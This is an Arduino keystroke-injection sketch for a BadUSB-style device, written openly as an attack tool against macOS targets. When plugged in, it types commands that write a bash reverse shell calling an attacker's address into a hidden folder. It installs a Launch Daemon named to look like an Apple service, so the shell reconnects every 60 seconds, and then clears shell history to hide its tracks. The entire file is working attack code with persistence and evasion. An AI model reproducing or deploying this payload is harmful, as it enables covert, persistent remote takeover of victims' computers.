#include <Keyboard.h>

/*
Makes a bash script that sends your target's shell to a server with TCP, 
makes a Launch Daemon that runs the bash script, it'll run whenever your 
target has their computer on, it sends a target shell every 60 seconds and 
you can concurrently have multiple shells. Inspired by a Rubber Ducky script 
by Patrick Mosca.
*/

void setup() {
  Serial.begin(9600);
  
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW) {
    Serial.print("aborting\n");
    abort();
  }

  Keyboard.begin();
  delay(3000);
  
  Keyboard.print("mkdir /Library/.hidden");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);

  Keyboard.print("echo '#!/bin/bash");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("bash -i >& /dev/tcp/[ADDRESS]/[PORT] 0>&1");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("wait' > /Library/.hidden/connect.sh");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("chmod +x /Library/.hidden/connect.sh");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);

  Keyboard.print("mkdir /Library/LaunchDaemons");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);

  Keyboard.print("echo '<plist version='1.0'>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<dict>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<key>Label</key>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<string>com.apples.services</string>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<key>ProgramArguments</key>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<array>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<string>zsh</string>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<string>-c</string>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<string>/Library/.hidden/connect.sh</string>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("</array>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<key>RunAtLoad</key>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<true/>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<key>StartInterval</key>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<integer>60</integer>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<key>AbandonProcessGroup</key>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("<true/>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("</dict>");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("</plist>' > /Library/LaunchDaemons/com.apples.services.plist");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("chmod 600 /Library/LaunchDaemons/com.apples.services.plist");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);

  Keyboard.print("launchctl load /Library/LaunchDaemons/com.apples.services.plist");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("history -c");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("clear");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {
}
